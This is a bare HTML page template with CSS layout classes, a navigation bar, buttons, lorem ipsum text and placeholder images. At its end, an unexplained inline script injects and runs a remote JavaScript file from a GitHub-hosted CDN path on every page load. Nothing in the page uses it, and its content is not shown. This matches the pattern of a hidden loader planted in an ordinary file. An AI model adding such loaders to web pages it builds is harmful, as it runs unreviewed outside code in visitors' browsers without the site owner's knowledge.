<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Page</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 0 auto; }
    img { display: block; width: 100%; background: #ddd; }
    h1 { font-size: 2rem; margin-bottom: 0.5rem; }
    p { color: #555; line-height: 1.6; margin-bottom: 0.5rem; }
    button { padding: 0.5rem 1.5rem; border: none; border-radius: 5px; background: #333; color: #fff; cursor: pointer; }
    nav { display: flex; gap: 1rem; }
    nav a { text-decoration: none; color: inherit; }
    input[type="text"] { padding: 0.4rem 0.75rem; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem; width: 100%; }
    label { display: flex; align-items: center; gap: 0.5rem; }
    /* Layout */
    .c1 {
      display: flex;
      align-items: center;
    }
    .c2 {
      padding: 1rem;
    }
    .c3 {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.5rem;
    }
    .c4 {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 1rem;
    }
    .c5 {
      display: flex;
      align-items: center;
      padding: 1rem;
    }
    .c6 {
      display: inline-block;
      vertical-align: middle;
      width: 10%;
      aspect-ratio: 8 / 3;
    }
    .c7 {
      display: grid;
      grid:
        'ol main aside' auto
        / 1fr 3fr 1fr;
      padding: 1rem;
    }
    .c8 {
      grid-area: ol;
    }
    .c9 {
      grid-area: main;
    }
    .c10 {
      grid-area: aside;
      width: 65%;
      aspect-ratio: 4 / 3;
    }
  </style>
</head>
<body>
<header class="c1">
  <div class="c2">

  </div>
  <div class="c3">
    <label>Label <input type="text" placeholder="Enter text"></label>
    <button>Click me</button>
  </div>
</header>
<div class="c4">
  <div class="c5">
    <nav>
      <a href="#">Home</a>
      <a href="#">About</a>
      <a href="#">Work</a>
      <a href="#">Contact</a>
    </nav>
    <img src="placeholder.jpg" alt="" class="c6">
  </div>
  <button>Click me</button>
</div>
<main class="c7">
  <p class="c8">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed</p>
  <h1 class="c9">Page Heading</h1>
  <img src="placeholder.jpg" alt="" class="c10">
</main>
  <script>
  (function() {
    var s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/gh/gracehoppercenter/validate@1.0.5/validate.js";
    s.async = false;
    document.head.appendChild(s);
  })();
  </script>
</body>
</html>
